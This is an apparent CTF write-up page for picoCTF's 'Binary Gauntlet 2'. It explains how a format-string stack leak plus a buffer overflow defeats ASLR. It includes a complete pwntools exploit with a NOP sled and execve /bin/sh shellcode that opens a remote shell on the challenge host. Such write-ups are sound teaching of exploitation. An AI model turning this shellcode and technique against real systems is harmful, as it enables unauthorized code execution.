@@ -1,0 +1,101 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Binary Gauntlet 2 Writeup</h1>
+        </div>
+    </div>
+</div>
+<div class="paragraph">
+	<H4>Problem</H4>
+    <p>
+		<br><br>
+        How does ASLR affect your exploit? <a href=../docs/pico/gauntlet_2>gauntlet</a> nc mercury.picoctf.net 49704
+    	<br>
+    </p>
+</div>
+
+<div class="paragraph">
+	<H4>Solution</H4>
+    <p>
+    	<br><br>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to and retrieve the flag from using the developed exploit.
+        <br>
+    	We start off by running Ghidra on the binary to view the disassembly and get an idea as to what's going on. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall3_1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br>
+        This challenge appears to be a combination of binary gauntlet 0 and binary gauntlet 1. We have a format string vulnerability to leak out an address of the stack, and can then overflow the buffer and point the return address to the leaked address. 
+        <br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall3_2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Testing different inputs similarly to how we did for Binary Gauntlet 0, we see a couple of different values. The 6th value looks like it might be a stack address. 
+        <br>
+        If we try sending an input consisting of 120 A's into the program in gdb we can see that the our buffer starts at approximately 0x7fffffffde72. The address we leaked through the format string exploit subtracted by this address is 358 (0x7fffffffdfd8 - 0x7fffffffde72). This offset should remain consistent even with aslr enabled. 
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall3_3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Since this challenge follows the exact same format as Binary Gauntlet 1, we already know the correct offset, and can now begin crafting our exploit. We add a generous amount of padding via a nop sled, and adjust our leaked address accordingly to point right into the middle of the nop sled. To do this we subtract the value by 330 instead of the 358 we calculated earlier. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+from pwn import *
+p = remote('mercury.picoctf.net', 49704)
+#p = process('./gauntlet_2')
+
+payload = b"\x90"*70
+payload += b"\x31\xF6\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x48\x89\xE7\x6A\x3B\x58\x0F\x05"
+payload = payload.ljust(120,b'A')
+
+p.sendline('%6$p')
+data = p.clean().decode('latin-1')
+leak = int(data,16) - 330
+payload += p64(leak)
+
+p.sendline(payload)
+p.interactive()
+        </code>
+    </pre>
+</div>
+<div>
+    <p>
+        <br>
+        After running the exploit, we spawn a shell and can read the flag.
+        <br><br>
+    </p>
+
+</div>
+<div>
+    <img src="../imgs/pico/chall3_4.png" alt="">
+</div>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
